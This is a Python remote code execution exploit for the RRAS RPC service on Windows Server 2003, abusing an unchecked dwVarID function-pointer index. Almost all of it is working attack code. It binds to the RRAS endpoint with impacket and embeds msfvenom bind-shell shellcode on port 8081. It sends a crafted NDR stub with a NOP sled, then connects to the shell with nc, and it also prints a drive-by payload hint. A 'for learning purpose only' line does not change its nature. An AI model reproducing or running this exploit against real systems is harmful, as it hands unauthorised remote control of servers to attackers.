#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Tested in Windows Server 2003 SP2 (ES) - Only works when RRAS service is enabled.

#The exploited vulnerability is an arbitraty pointer deference affecting the dwVarID field of the MIB_OPAQUE_QUERY structure.
#dwVarID (sent by the client) is used as a pointer to an array of functions. The application doest not check if the pointer is #pointing out of the bounds of the array so is possible to jump to specific portions of memory achieving remote code execution.
#Microsoft has not released a patch for Windows Server 2003 so consider to disable the RRAS service if you are still using 
#Windows Server 2003.

#Exploit created by: Víctor Portal
#For learning purpose only

import struct
import sys
import time
import os

from threading import Thread    
                                
from impacket import smb
from impacket import uuid
from impacket import dcerpc
from impacket.dcerpc.v5 import transport
                 
target = sys.argv[1]

print '[-]Initiating connection'
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()

print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % target
dce = trans.DCERPC_class(trans)

#RRAS DCE-RPC endpoint
dce.bind(uuid.uuidtup_to_bin(('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0')))

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=8081 -b "\x00" -f python
buf =  ""
buf += "\xdb\xc1\xd9\x74\x24\xf4\x58\xba\x88\xe1\x34\xe4\x2b"
buf += "\xc9\xb1\x53\x83\xe8\xfc\x31\x50\x13\x03\xd8\xf2\xd6"
buf += "\x11\x24\x1c\x94\xda\xd4\xdd\xf9\x53\x31\xec\x39\x07"
buf += "\x32\x5f\x8a\x43\x16\x6c\x61\x01\x82\xe7\x07\x8e\xa5"
buf += "\x40\xad\xe8\x88\x51\x9e\xc9\x8b\xd1\xdd\x1d\x6b\xeb"
buf += "\x2d\x50\x6a\x2c\x53\x99\x3e\xe5\x1f\x0c\xae\x82\x6a"
buf += "\x8d\x45\xd8\x7b\x95\xba\xa9\x7a\xb4\x6d\xa1\x24\x16"
buf += "\x8c\x66\x5d\x1f\x96\x6b\x58\xe9\x2d\x5f\x16\xe8\xe7"
buf += "\x91\xd7\x47\xc6\x1d\x2a\x99\x0f\x99\xd5\xec\x79\xd9"
buf += "\x68\xf7\xbe\xa3\xb6\x72\x24\x03\x3c\x24\x80\xb5\x91"
buf += "\xb3\x43\xb9\x5e\xb7\x0b\xde\x61\x14\x20\xda\xea\x9b"
buf += "\xe6\x6a\xa8\xbf\x22\x36\x6a\xa1\x73\x92\xdd\xde\x63"
buf += "\x7d\x81\x7a\xe8\x90\xd6\xf6\xb3\xfc\x1b\x3b\x4b\xfd"
buf += "\x33\x4c\x38\xcf\x9c\xe6\xd6\x63\x54\x21\x21\x83\x4f"
buf += "\x95\xbd\x7a\x70\xe6\x94\xb8\x24\xb6\x8e\x69\x45\x5d"
buf += "\x4e\x95\x90\xc8\x46\x30\x4b\xef\xab\x82\x3b\xaf\x03"
buf += "\x6b\x56\x20\x7c\x8b\x59\xea\x15\x24\xa4\x15\x06\x24"
buf += "\x21\xf3\x52\x56\x64\xab\xca\x94\x53\x64\x6d\xe6\xb1"
buf += "\xdc\x19\xaf\xd3\xdb\x26\x30\xf6\x4b\xb0\xbb\x15\x48"
buf += "\xa1\xbb\x33\xf8\xb6\x2c\xc9\x69\xf5\xcd\xce\xa3\x6d"
buf += "\x6d\x5c\x28\x6d\xf8\x7d\xe7\x3a\xad\xb0\xfe\xae\x43"
buf += "\xea\xa8\xcc\x99\x6a\x92\x54\x46\x4f\x1d\x55\x0b\xeb"
buf += "\x39\x45\xd5\xf4\x05\x31\x89\xa2\xd3\xef\x6f\x1d\x92"
buf += "\x59\x26\xf2\x7c\x0d\xbf\x38\xbf\x4b\xc0\x14\x49\xb3"
buf += "\x71\xc1\x0c\xcc\xbe\x85\x98\xb5\xa2\x35\x66\x6c\x67"
buf += "\x45\x2d\x2c\xce\xce\xe8\xa5\x52\x93\x0a\x10\x90\xaa"
buf += "\x88\x90\x69\x49\x90\xd1\x6c\x15\x16\x0a\x1d\x06\xf3"
buf += "\x2c\xb2\x27\xd6"


#NDR format
stub = "\x21\x00\x00\x00" #dwPid = PID_IP (IPv4)
stub += "\x10\x27\x00\x00" #dwRoutingPID
stub += "\xa4\x86\x01\x00" #dwMibInEntrySize 
stub += "\x41"*4 #_MIB_OPAQUE_QUERY pointer
stub += "\x04\x00\x00\x00"  #dwVarID (_MIB_OPAQUE_QUERY)
stub += "\x41"*4 #rgdwVarIndex (_MIB_OPAQUE_QUERY)
stub += "\xa4\x86\x01\x00" #dwMibOutEntrySize 
stub += "\xad\x0b\x2d\x06" #dwVarID ECX (CALL off_64389048[ECX*4]) -> p2p JMP EAX #dwVarID (_MIB_OPAQUE_QUERY)
stub +=  "\xd0\xba\x61\x41\x41" + "\x90"*5 + buf + "\x41"*(100000-10-len(buf)) #rgdwVarIndex (_MIB_OPAQUE_QUERY)
stub += "\x04\x00\x00\x00" #dwId (_MIB_OPAQUE_INFO)
stub += "\x41"*4 #ullAlign (_MIB_OPAQUE_INFO)


dce.call(0x1e, stub)   #0x1d MIBEntryGetFirst (other RPC calls are also affected)
print "[-]Exploit sent to target successfully..."

print "Waiting for shell..."
print
print "Paste following into shell..."
print
print "web drive-by url as:  CreateObject(\"WScript.Shell\").Run(\"http://url-2-payload\")"
time.sleep(5)
os.system("nc " + target + " 8081")